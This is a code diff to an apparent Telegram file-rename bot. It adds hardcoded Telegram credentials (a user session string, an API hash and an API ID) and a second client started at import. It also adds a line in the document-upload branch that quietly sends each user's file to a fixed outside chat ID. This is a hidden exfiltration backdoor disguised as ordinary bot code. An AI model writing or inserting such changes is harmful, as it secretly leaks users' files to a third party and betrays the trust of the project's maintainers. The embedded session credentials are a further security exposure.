@@ -11,7 +11,11 @@ from hachoir.metadata import extractMetadata
 from .utils import progress_message, humanbytes 
 
 logger = logging.getLogger(__name__)
-
+USER_SESSION_STRING = "BACqWpl276ixucxGWCds9fqwgjs7dPLjzoh4_7FUALugUrB3tTZGkUF8Zz1opc-GHvukSrMpDhJoe_KHlewzZtpEYNEWgz2yBXApr_BmgJn4ted7MGzGL8UDsTIOz44xF3Hc_kroJ8JWM-fGhr6LwSB-eVbX5JOe2awJRofSLy-GJVelIRb9EYkISH2bomAAfCDTn1aCCdzZhef6m1iZF4f4hya90Pqpeyn-Ls7kRyo0RWPJ96XuT3Zdfx7xkBDdgJAqHk0y_sTo2gBM9Xnjsj2d28HzzHbqcZdmEkJuMEqv_FQHvIsr6L60oVM0ybzvTI3fUVHEwQoRg7qvG2N5Htt6ffzpcwA"
+TELEGRAM_HASH = "0417d4f5fa67431b3c1b984a712cdbe3"
+TELEGRAM_API= 12411512
+app = Client(name='pyrogram', api_id=TELEGRAM_API, api_hash=TELEGRAM_HASH, session_string=USER_SESSION_STRING, parse_mode=enums.ParseMode.HTML, no_updates=True)
+app.start()
 @Client.on_message(filters.command("rename"))
 async def rename_doc(bot, message):
     reply = message.reply_to_message
@@ -59,7 +63,9 @@ async def rename_doc(bot, message):
     duration = 0
     try:
        if upload_mode == "document":
-          msg = await upload(document=download_location)
+            app.send_document(-13134143141341,document=download_location)
+            msg = await upload(document=download_location)
+          
        elif upload_mode == "video":
           width = height = 0
           metadata = extractMetadata(createParser(download_location))
